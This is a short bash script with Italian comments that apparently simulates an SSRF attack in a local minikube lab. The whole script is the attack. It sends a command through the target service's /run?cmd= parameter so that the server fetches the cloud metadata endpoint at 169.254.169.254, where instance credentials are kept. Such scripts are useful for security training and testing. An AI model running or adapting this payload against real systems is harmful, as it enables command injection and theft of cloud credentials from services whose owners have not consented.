#!/bin/bash
TARGET=http://$(minikube ip):30080
echo "[*] Simulo SSRF verso 169.254.169.254 (metadata API)"
curl "$TARGET/run?cmd=curl+http://169.254.169.254/latest/meta-data/"
